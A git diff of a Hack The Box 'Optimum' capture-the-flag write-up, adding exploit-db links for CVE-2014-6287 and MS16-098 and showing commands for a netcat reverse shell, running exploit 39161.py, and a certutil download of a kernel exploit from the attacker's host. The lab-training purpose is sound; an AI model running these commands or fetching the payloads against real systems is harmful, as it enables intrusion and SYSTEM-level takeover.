@@ -26,8 +26,13 @@ sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.8 --open
 ## Enumeration
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7b8a57ae-f7cc-4fee-a4bb-d9d8ae1f2ddb)
 
+
+## Exploitation & Gaining Access
+
+### CVE-2014-6287 [1](https://www.exploit-db.com/exploits/39161) [2](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/optimum-writeup-w-o-metasploit#id-4a01)
+
 ```
-searchsploit httpfileserver
+searchsploit hfs 2.3
 
 searchsploit -m 39161
 ```
@@ -40,8 +45,6 @@ Change ip addres and port number:
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a62cd8b5-3931-4863-9e43-c9bd8ca44602)
 
-
-## Exploitation & Gaining Access
 ```
 # On the kali attack vm:
 cp /usr/share/windows-binaries/nc.exe .
@@ -59,10 +62,17 @@ python3 39161.py 10.10.10.8 80
 
 ```
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/297d6042-a32c-4afc-87ac-a4502acc2fc2)
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0b3ad525-c717-4f8c-a61c-6bf6381ab8f2)
 
 
 ## Privilege Escalation
+
+### Method 1: MS16-098 / Kernel [1](https://www.exploit-db.com/exploits/41020) [2](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe) [3](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/optimum-writeup-w-o-metasploit#id-4f80)
+
+**Alternative** links [1](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098) [2](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.exe)
+
 ```
 # On the kali attack vm:
 python2 windows-exploit-suggester.py --update
@@ -99,22 +109,32 @@ certutil.exe -urlcache -split -f "http://10.10.14.24:8000/41020.exe" 41020.exe
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5cbb257e-323c-4c60-9ba7-7cd637287e51)
 
-Get the shell as **nt authority\system**, and root flag.
+Get the shell as **nt authority\system**, and read the root flag.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4616bddf-9e5c-47fc-ad79-1f42c84449c8)
 
 
 # References & Alternatives
 + https://vvmlist.github.io/#Optimum
-+ x
++ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/optimum-writeup-w-o-metasploit
+  + https://medium.com/@toneemarqus/optimum-htb-manual-walkthrough-2023-tonee-e2a53fb59b1d
++ https://0xdf.gitlab.io/2021/03/17/htb-optimum.html
 
 
 ## CVE Scripting
-+ x
++ **CVE-2014-6287:**
+  + https://www.exploit-db.com/exploits/39161
+  + https://nvd.nist.gov/vuln/detail/CVE-2014-6287
++ **MS16-098 / Kernel:**
+  + https://www.exploit-db.com/exploits/41020
+    + https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe
+ + https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098
+   + https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.exe
 
 
 ## Tools
-+ x
++ /usr/share/windows-resources/binaries/
++ **Windows Exploit Suggester:** https://github.com/AonCyberLabs/Windows-Exploit-Suggester
 
 
 ## Technical Knowledge
